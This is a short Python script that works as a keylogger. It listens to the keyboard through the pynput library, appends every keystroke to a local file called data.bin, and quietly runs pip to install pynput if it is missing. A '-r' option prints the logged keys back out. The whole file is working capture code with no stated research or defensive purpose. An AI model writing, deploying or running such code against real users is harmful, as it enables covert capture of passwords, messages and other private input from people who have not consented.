import os,time,sys

try:
    if sys.argv[1] == "-r" and os.path.exists("data.bin"):
        with open("data.bin","r") as tmp:
            tmp = tmp.read().replace("\n"," ")
            input(tmp)
        exit()
except IndexError:
    pass

try:
    from pynput.keyboard import Key, Listener
except ImportError:
    os.system("pip install pynput -q")

def on_press(key):
    raw = open("data.bin","a")
    if "Key." in str(key):
        raw.write(str(key).replace("Key.","")+"\n")
    else:
        raw.write(str(key).replace("'","")+"\n")
    raw.close()

with Listener(on_press=on_press) as listener:
    listener.join()

while True:
    pass